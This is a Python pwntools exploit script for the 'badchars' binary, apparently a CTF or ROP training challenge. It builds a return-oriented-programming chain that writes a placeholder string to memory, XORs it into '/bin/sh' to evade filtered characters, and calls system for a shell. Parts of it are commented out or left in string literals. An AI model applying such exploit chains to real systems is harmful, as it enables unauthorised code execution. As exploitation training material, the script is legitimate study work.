#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h'] #GDB splits
context.log_level = 'debug'
exe = './badchars'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *main
#break *pwnme+231
#break *usefulFunction+9
#set follow-fork-mode child
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
badchars are: b i c / <space> f n s
'00000000  62 69 63 2f  20 66 6e 73
│bic/\x1b[34m│\x1b[m fns│\n00000008'
]]'
"""
elf = ELF(exe)
rop = ROP(elf)
io = start()
#io = gdb.debug(exe, gdbscript='break *main', '--test')

#Prep 'l' for xor into 's'
"""
pops = rop.find_gadget(['pop r14', 'pop r15', 'ret'])
rop.raw(pops.address)
rop.raw(p64(0x1f))
rop.raw(p64(0x004006e0)) #address of 'l' in /bin/ls

#0x0000000000400b30 : xor byte ptr [r15], r14b ; ret (/)
xor = elf.sym.usefulGadgets
rop.raw(xor)

#Prep 's' for xor into 'h'
rop.raw(pops.address)
rop.raw(p64(0x1b))
rop.raw(p64(0x400c35)) #address of 'l' in /bin/ls

#0x0000000000400b30 : xor byte ptr [r15], r14b ; ret (/)
rop.raw(xor)
"""

"""
#Moves a string to puts@got.plt for subsequent xor
pops = rop.find_gadget(['pop r12','pop r13', 'ret'])
#init_array = elf.get_section_by_name('.init_array').header.sh_addr
#exit = elf.sym.got.exit
exit = 0x00601078
print(hex(exit))
rop.raw(pops.address)
#rop.raw(p64(0x00400c2f)) #address of /bin/ls
rop.raw(p64(int(b'aaaaaaa'.hex(),16))) #string to XOR
rop.raw(p64(exit)) #address of .free

#0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
rop.raw(p64(0x400b34))

#Begin XOR process from 'aaaaaaa' to '/bin/sh'
pops = rop.find_gadget(['pop r14', 'pop r15', 'ret'])
#0x0000000000400b30 : xor byte ptr [r15], r14b ; ret (/)
xor = elf.sym.usefulGadgets
xor_chars = [0x4e, 0x3, 0x8, 0xf, 0x4e, 0x12, 0x9]
for i in range(0,7):
    rop.raw(pops.address)
    rop.raw(p64(xor_chars[i]))
    rop.raw(p64(exit+i)) 
    rop.raw(xor)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
rop.raw(pop_rdi.address)
rop.raw(p64(exit))

system = elf.sym.usefulFunction + 9
#system = elf.plt.system
rop.raw(p64(system))

#Send payload
print(rop.dump())
#badchars = b'bic/ fns'
payload = fit({40:rop.chain()}, filler=b'a')

io.sendline(payload)
"""

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

